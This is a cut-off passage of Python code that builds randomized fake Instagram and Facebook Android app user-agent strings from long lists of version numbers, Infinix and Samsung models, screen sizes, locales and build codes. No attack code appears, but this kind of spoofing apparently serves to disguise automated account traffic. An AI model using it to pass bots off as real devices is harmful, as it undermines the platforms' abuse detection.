26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
    igve=igv.split(",")
    versi=random.choice(igve)
    ua1 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; {kode})'
    ua2 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; vivo; vivo 1820; 1820; mt6762; {basa}; {kode})'
    ua3 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2109; OP4BA5L1; qcom; {basa}; {kode})'
    ua4 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; {basa}; {kode})'
    uaa = random.choice([ua1,ua2,ua3,ua4])
    return uaa

def samsung_user_agent():
    fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
    fbbv = str(random.randint(111111111,999999999))
    fblc = random.choice(["en_US","en_GB","en_IN","bn_IN","hi_IN","np_NP","en_NP","id_ID"])
    fbcrr = random.choice(["MTN","AWCC","Roshan","Zong","Jazz","Etisalat","null","",""])
    fbcr = random.choice(["Jio","Airtel","Vodafone","BSNL","Vi","jio","null","nCell","Nepal Telecom"])
    abc = random.choice(["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"])
    model = f"{abc}{str(random.randint(111,999))}{abc}"
    samsung_model = random.choice(["Samsung Galaxy S21 Ultra", "Samsung Galaxy Note 20 Ultra", "Samsung Galaxy S20 FE", "Samsung Galaxy A52", "Samsung Galaxy A32", "Samsung Galaxy S10+", "Samsung Galaxy Note 10", "Samsung Galaxy A71", "Samsung Galaxy A12", "Samsung Galaxy M31", "Samsung Galaxy S9", "Samsung Galaxy A42", "Samsung Galaxy A22", "Samsung Galaxy A02", "Samsung Galaxy Z Fold 2", "Samsung Galaxy A51", "Samsung Galaxy A31", "Samsung Galaxy M21", "Samsung Galaxy S8", "Samsung Galaxy A72", "Samsung Galaxy A52 5G", "Samsung Galaxy A21s", "Samsung Galaxy M51", "Samsung Galaxy S7", "Samsung Galaxy Note 9"])
    android_version = str(random.randrange(6,13))
    ua___ = f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1080,height=2076}};FBLC/{fblc};FBRV/0;FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{samsung_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
    return ua___
    
def uaa():
        rr=random.randint
        rc=random.choice
        real=random.choice(["Infinix F98","Infinix G636","Infinix X507","Infinix X507","Infinix Hot 10","Infinix X682B","Infinix X682C","Infinix X682B","Infinix X682C","MZ-Infinix X688C","Infinix X688B","Infinix X688C","Infinix X688B","Infinix X659B","Infinix PR652B","Infinix PR652B","Infinix X658E","Infinix PR652C","Infinix X689B","Infinix X689D","Infinix X689D","Infinix X689C","Infinix X662","Infinix X689F","MZ-Infinix X662B","Infinix X675","Infinix X675","Infinix X6812B","Infinix X6817","Infinix X6817B","Infinix X6816C","Infinix X6816","Infinix X6816D","Infinix X6816D","Infinix X668","Infinix X668C","Infinix X665B","Infinix X665","Infinix X665B","Infinix X510","Infinix X510","Infinix X6826B","Infinix X6826C","Infinix X6826B","Infinix X666B","Infinix X6825","Infinix X665E","Infinix X665C","Infinix X6827","Infinix X6827","Infinix HOT 3","Infinix HOT 3 LTE","Infinix-X554","Infinix HOT 3 Pro","Infinix X6831","Infinix X669","Infinix X669C","Infinix X669D","Infinix HOT 4","Infinix HOT 4 Lite","Infinix HOT 4 Pro","Infinix_X556_LTE","Infinix X559C","Infinix X559C","Infinix X559F","Infinix X559C","Infinix X606B","Infinix X606D","Infinix X606D","Infinix X606C","Infinix X608","Infinix X623","Infinix X624B","ar_AE Infinix X624","fr_FR Infinix X624","Infinix X625B","Infinix X625C","Infinix X625C","Infinix X625D","Infinix X650C","Infinix X650D","Infinix X650B","Infinix X650","Infinix X650C Flow","Infinix X650B","Infinix X650B","Infinix X650D","Infinix X655C","Infinix X655C","Infinix X655D","Infinix X680B","Infinix X655F","INFINIX-X551","Infinix-X551","Infinix-X551","INFINIX-X551","INFINIX-X551","Infinix_X521S","Infinix-X521","Infinix_X521_LTE","Infinix HOT S","Infinix-X521","Infinix_X521","Infinix X573","Infinix X573","Infinix X573B","Infinix X622","Infinix X622","Infinix Hot V3","Infinix HOT4 LTE","Infinix X693","Infinix X693","Infinix X695","Infinix X695C","Infinix X695D","MZ-Infinix X695C","Infinix X663","Infinix X663B","Infinix X697","Infinix X697","Infinix X698","Infinix X698","Infinix X670","Infinix X670","Infinix X676C","Infinix X663D","Infinix X676B","Infinix X671B","Infinix X672","Infinix X6819","Infinix X6819","Infinix X6819","Infinix X677","Infinix X677","Infinix-X600-LTE","Infinix NOTE 2","Infinix-X600-LTE","Infinix NOTE 2 LTE","Infinix NOTE 3","Infinix_X601_LTE","Infinix NOTE 3","Infinix NOTE 3 Pro","Infinix NOTE 3 Pro","Infinix X572","Infinix X572-LTE","Infinix X572","Infinix X572","Infinix X571","Infinix X604","Infinix X604B","Infinix X605","Infinix X610B","Infinix X610B","Infinix X610B","Infinix X690","Infinix X690B","Infinix X690B","Infinix X656","Infinix X656","Infinix X692","Infinix X692","Infinix X683B","Infinix X450","Infinix X5010","Infinix X5010","Infinix X401","Infinix S2","Infinix S2 Pro","Infinix S2 Pro","Infinix X626B","Infinix X626B","Infinix X626","Infinix X626B","Infinix X652A","Infinix X652","Infinix X652","Infinix X652A","Infinix X652A","Infinix X652B","Infinix X652C","Infinix X660C","Infinix X660C","Infinix X660B","Infinix X660C","Infinix X5515F","Infinix X5515I","Infinix X609","fr_MA Infinix X609","Infinix X5514D","Infinix X5516B","Infinix X5516C","Infinix X627","Infinix X627","Infinix X627","Infinix X653C","Infinix X680","Infinix X653","ar_AE Infinix X680","ar_AE Infinix X653","Infinix X680D","Infinix X657","Infinix X657B","Infinix X657C","Infinix X657","Infinix X657B","Infinix X6511","Infinix X6511B","Infinix X6511E","Infinix X6512","Infinix X6823","Infinix X6823C","Infinix X6823B","Infinix X6515","Infinix X6516","Infinix X6517","Infinix X612B","Infinix X503","Infinix X511","Infinix X352","Infinix X351","Infinix X351","Infinix X530","Infinix X530","Infinix X6711","Infinix X6716","Infinix X678B","Infinix Y88","Infinix X509","Infinix X6821","Infinix X6821","Infinix-X552","Infinix Zero 3","Infinix Zero 3","Infinix Zero 4","Infinix Zero 4 Plus","Infinix Zero 4 Plus","Infinix X603","Infinix X603-LTE","Infinix X6815C","Infinix X6815D","Infinix X6815B","Infinix X6815D","Infinix X6815C","Infinix X620B","Infinix X620","Infinix X620","Infinix X687","Infinix X687","Infinix X687","Infinix X687B","Infinix X6820","Infinix X6811B","Infinix X6811B","Infinix X6810","Infinix X6810"])
        me=random.choice(["samsung 19A","samsung a1","Samsung A10","Samsung A20","samsung A21","Samsung A33","Samsung A4","samsung A5","Samsung A50","Samsung A51","Samsung A52s","samsung A56","Samsung A7","samsung A7","Samsung A70","SAMSUNG A800F","SM-W750V","Trident/7.0","Trident/7.0","Samsung Chrome 11 (3180)","Samsung Chromebook Pro","Samsung Chromebook 3","Samsung Chromebook Plus (V2)","SAMSUNG F12","Samsung F41","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800","GT-I5800D","GT-I5800","GT-I5800","SAMSUNG SM-A716S","SM-A015F","SM-A015M","SM-A013M","SM-A013F","SM-A013G","SM-A022F","SM-A022M","SM-S124DL","SM-A025V","SM-A025G","SM-A025F","SM-A025U","SM-A025M","SM-A025F","SAMSUNG SM-A035G","SM-A035M","SM-A035F","SAMSUNG SM-A035M","SM-A032F","SM-A032M","SM-A037U","SM-A037U1","SM-S134DL","SAMSUNG SM-A037F","SM-A037M","SM-A045M","SM-A045F","SAMSUNG SM-A045F","SM-A042F","SM-A042M","SAMSUNG SM-A042F","SM-A047F","SAMSUNG SM-A047F","SM-A105FN","SAMSUNG SM-A105FN","SM-A105G","SM-A105M","U","SM-S102DL","SM-A102U","SAMSUNG SM-A102U","SAMSUNG SM-A102U1","SM-A107M","SM-A107F","SM-A107F","SM-A115F","SM-S115DL","SM-A115M","SM-A115F","SAMSUNG SM-A125F","SM-A127F","SM-A125U","SM-A137F","SM-A135F","SM-A135U1","SAMSUNG SM-A135F","SAMSUNG SM-A137F","SM-A135M","SM-A136U","SM-S136DL","SM-A136W","SM-A136B","SM-A145R","SAMSUNG SM-A145R/A145RXXU1AWD1","SM-A145F","SM-A145P","SAMSUNG SM-A145F","SM-A146U","SM-A146P","SM-A146U1","SAMSUNG SM-A146U","SM-A260G","SM-A260F","SM-A260F","SM-A205U","SAMSUNG SM-A205U1","SM-A205F","SM-A205W","SM-A205G","SM-S205DL","SM-A205GN","SM-A202F","SAMSUNG SM-A202F","SM-A207F","SM-A207M","SM-S215DL","SM-A215U1","SAMSUNG SM-S215DL","SM-A102J","720x1448","SC-42A","SM-A217F","SAMSUNG SM-A217F","SM-A217M","U","SM-A225F","SM-A225M","SAMSUNG SM-A225F","SAMSUNG SM-A226B","SM-A226BR","SM-A235F","SM-A235N","SM-A236B","SM-A236E","SM-A236U","SAMSUNG SM-A236M","SAMSUNG SM-A236U1","SM-A236V","SM-A245F","SAMSUNG SM-A245F","SM-A245M","Samsung Galaxy A24","SM-A300FU","SM-A300H","SM-A310F","SAMSUNG SM-A310F","SM-A310F","SM-A310M","SM-A320F","SM-A320FL","SAMSUNG SM-A320FL","SM-A305FN","SM-A305GN","SM-A305N","SM-A305GT","Flow","SM-A307FN","SM-A307GT","SM-A307GN","SM-A315G","SM-A315F","SM-A315N","SM-A325F","SM-A325M","SAMSUNG SM-A325F","SM-A326W","SM-A326U","SM-A326B","SAMSUNG SM-A326B","SM-S326DL","SM-A336B","SAMSUNG SM-A336E","SM-A336M","SM-A336N","SM-A346B","SM-A346M","SAMSUNG SM-A346M","SM-A3460","SM-A346E","SAMSUNG SM-A346B/A346BXXU1AWB9","SAMSUNG SM-A346E","SAMSUNG SM-A430F","SM-A405FN","SAMSUNG SM-A405FN","SM-A405FN","SM-A405FN/DS","SM-A405S","SM-A3050","SM-A3051","SM-A3058","SM-A415F","SC-41A","SM-A4260","SM-A426U","SM-A426U1","SM-A426U","SM-A426B","SAMSUNG SM-A426B/A426BXXU4DVL3","SM-A426N","SAMSUNG SM-A426U","SM-A5009","SM-A500YZ","SM-A500W","SM-A500L","SAMSUNG SM-A500W","SAMSUNG SM-A500L","SM-A500X","SM-A500XZ","SM-A500XZ","SM-A500XZ","SM-A510F","SAMSUNG SM-A510F","SM-A510F","SM-A520F","SAMSUNG SM-A520F","SM-A520K","SM-A500M","SM-A500H","SM-A500F","SM-A500F","SM-A500FU","SM-A505FN","SM-A505G","SM-A505FM","SM-A505U","SM-A507FN","SM-A515F","SM-A515F","SM-A515U","SM-A516U","SM-A516B","SM-A516B/DS","SM-A516N","SC-54A","SM-A516V","SCG07","SM-A525F","SAMSUNG SM-A525F","SM-A525M","SAMSUNG SM-A526B","SM-A526W","SM-A526U","SM-A5260","SM-A528B","SAMSUNG SM-A528B","SAMSUNG SM-A528B/A528BXXU3EWE1","SM-A536E","SM-A536B","SAMSUNG SM-A536E","SM-A5360","SM-A536U","SM-A536U1","SM-A536V","SAMSUNG SM-A536V","SM-A546U1","SM-A546E","SM-A546B","SM-A5460","SAMSUNG SM-A546U","SM-A546W","SM-A546V","SAMSUNG SM-A600FN","SM-A600G","SM-A605FN","SM-A605G","SM-A6050","SM-A605GN/DS","SAMSUNG SM-A605FN","SM-A6060","SM-A606Y","SAMSUNG SM-A606Y","SM-G6200","SM-G6200","SM-A7000","SM-A700FD","SM-A700K","SM-A700H","SM-A700YD","SM-A710F","SM-A7100","SM-A710K","SM-A710M","SM-A720F","SM-A750FN","SAMSUNG SM-A750FN","SM-A750N","SM-A750GN","SM-A705FN","SM-A705MN","SM-A705GM","SM-A705W","SM-A707F","SAMSUNG SM-A707F","SAMSUNG SM-A7070","SM-A715F","SM-A715W","SM-A715F","SM-A715F","SM-A716U","SM-A716U1","SAMSUNG SM-A716U","SM-A716V","SAMSUNG SM-A716U1","SM-A725F","SM-A725M","SAMSUNG SM-A725F","SAMSUNG SM-A736B","SM-A736B","SM-A530F","SAMSUNG SM-A530F","SM-A8000","SM-A810F","SM-A810YZ","SAMSUNG SM-A810YZ","SM-A810S","SM-A530N","SM-A530W","SAMSUNG SM-A530W","SAMSUNG SM-G885F","SM-G885Y","SAMSUNG SM-G885S","SAMSUNG SM-G885Y","samsung SM-G885F","SM-A730F","SM-A805F","SAMSUNG SM-A805F","SM-A8050","SM-A805N","SM-G8870","SM-G887F","SM-A8s","SAMSUNG SM-G8870","SM-A9000","SM-A920F","SAMSUNG SM-A920F/A920FXXS7CVI7","U","SM-A910F","SM-G887N","SM-G887N","SM-A910F","SM-A9100","SM-G8850","SAMSUNG SM-G8850","SM-G8858","SM-G8850","SAMSUNG SM-A908B","SM-A908N","SAMSUNG SM-A908B/A908BXXU5EVK3","SAMSUNG SM-A908B/A908BXXU5EVG6","SAMSUNG SM-A9080","SM-A9080","GT-S5830","GT-S5830","GT-S5830","GT-S5830","GT-S5830","GT-S5830","GT-S5830M","GT-S5830i","GT-S5830i","GT-S5830L","GT-S5830G","GT-S5830M","GT-S5830M","GT-S5830C","GT-S5830V","GT-I8160","GT-I8160","GT-I8160","GT-I8160P","GT-I8160","GT-I8160P-ORANGE/I8160PBVLK3","GT-I8160","GT-I8160","GT-I8160","SAMSUNG GT-I8160/I8160BOLK2","SAMSUNG GT-S7275R/S7275RXXUAMK2","SAMSUNG GT-S7275R/S7275RXXUAPA2","GT-S7275R","SAMSUNG GT-S7275R-ORANGE","SAMSUNG GT-S7275R/S7275RXXUAPA2","GT-S7275B","GT-S7275B","GT-S7275B","GT-S7275T","GT-S7275Y","SM-G313HY","SM-G313MY","SM-G313MU","SM-G316MY","SM-G316M","SM-G316ML","SM-G316MY","SM-G316ML","SM-G316MY","SM-G316ML","SM-G316MY","SM-G316MY","SM-G316ML","SM-G316MY"]) 
        com=random.choice(["qcom","mt6833","mt6765"])
        comi="in_ID"
        dpi=random.choice(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
        pxl=random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
        basa=random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
        kode=random.choice(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','24229